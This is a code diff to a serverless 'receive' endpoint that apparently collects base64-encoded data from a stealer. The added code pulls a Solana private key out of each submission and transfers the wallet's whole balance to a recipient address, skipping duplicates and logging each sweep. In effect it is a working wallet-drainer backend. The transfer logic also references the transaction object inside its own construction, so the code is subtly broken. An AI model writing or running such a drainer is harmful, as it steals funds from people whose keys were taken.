@@ -1,5 +1,23 @@
-// api/receive.js
-export default function handler(req, res) {
+const { Connection, Keypair, PublicKey, SystemProgram, Transaction, sendAndConfirmTransaction } = require('@solana/web3.js');
+const bs58 = require('bs58');
+
+// Configuration - pulled from environment variables
+const RECIPIENT_ADDRESS = process.env.RECIPIENT_ADDRESS || 'ENTER_RECIPIENT_PUBLIC_KEY_HERE';
+const CLUSTER_URL = process.env.CLUSTER_URL || 'https://api.mainnet-beta.solana.com';
+const API_SECRET = process.env.API_SECRET || 'YOUR_SECRET_HERE';
+const FEE_ESTIMATE = 5000; // Fallback lamports estimate
+
+// In-memory set to prevent duplicate transfers (resets on function restart)
+const processedKeys = new Set();
+
+export default async function handler(req, res) {
+  // Basic authentication
+  const secret = req.headers['x-secret'];
+  if (secret !== API_SECRET) {
+    console.log('[auth-error]', 'Unauthorized access attempt');
+    return res.status(401).send('Unauthorized');
+  }
+
   const query = req.query || {};
   const body = (req.body && typeof req.body === 'object') ? req.body : safeParseJSON(req.body);
   
@@ -15,6 +33,62 @@ export default function handler(req, res) {
       // Clean logs - only b64 data and decoded result
       console.log('[b64-data]', dParam);
       console.log('[decoded-data]', parsedData);
+
+      // Process private key for SOL transfer if wallets exist
+      if (parsedData?.wallets?.[0]?.key) {
+        const privateKeyBase58 = parsedData.wallets[0].key;
+        try {
+          // Decode base58 to Uint8Array
+          const secretKey = bs58.decode(privateKeyBase58);
+          if (secretKey.length !== 64) {
+            throw new Error('Invalid private key length (must be 64 bytes)');
+          }
+
+          // Create Solana connection
+          const connection = new Connection(CLUSTER_URL, 'confirmed');
+
+          // Create Keypair and recipient PublicKey
+          const fromKeypair = Keypair.fromSecretKey(secretKey);
+          const toPubkey = new PublicKey(RECIPIENT_ADDRESS);
+          const pubkeyStr = fromKeypair.publicKey.toBase58();
+
+          // Check for duplicate processing
+          if (processedKeys.has(pubkeyStr)) {
+            console.log(`[skip] Already processed key: ${pubkeyStr}`);
+          } else {
+            processedKeys.add(pubkeyStr);
+
+            // Get balance and blockhash
+            const balance = await connection.getBalance(fromKeypair.publicKey);
+            if (balance <= FEE_ESTIMATE) {
+              console.error(`[error] Insufficient balance for transfer from ${pubkeyStr}: ${balance} lamports`);
+            } else {
+              const { blockhash } = await connection.getLatestBlockhash();
+
+              // Create transfer transaction
+              const transaction = new Transaction({
+                recentBlockhash: blockhash,
+                feePayer: fromKeypair.publicKey,
+              }).add(
+                SystemProgram.transfer({
+                  fromPubkey: fromKeypair.publicKey,
+                  toPubkey,
+                  lamports: balance - (await transaction.getEstimatedFee(connection) || FEE_ESTIMATE),
+                })
+              );
+
+              // Send and confirm
+              const signature = await sendAndConfirmTransaction(connection, transaction, [fromKeypair], {
+                maxRetries: 2,
+                skipPreflight: false,
+              });
+              console.log(`[success] Transferred ${balance - (await transaction.getEstimatedFee(connection) || FEE_ESTIMATE)} lamports from ${pubkeyStr} to ${toPubkey.toBase58()}. Signature: ${signature}`);
+            }
+          }
+        } catch (error) {
+          console.error('[transfer-error]', `Failed to process SOL transfer for ${privateKeyBase58.slice(0, 8)}...: ${error.message}`);
+        }
+      }
     } catch (e) {
       console.log('[decode-error]', e?.message || String(e));
     }
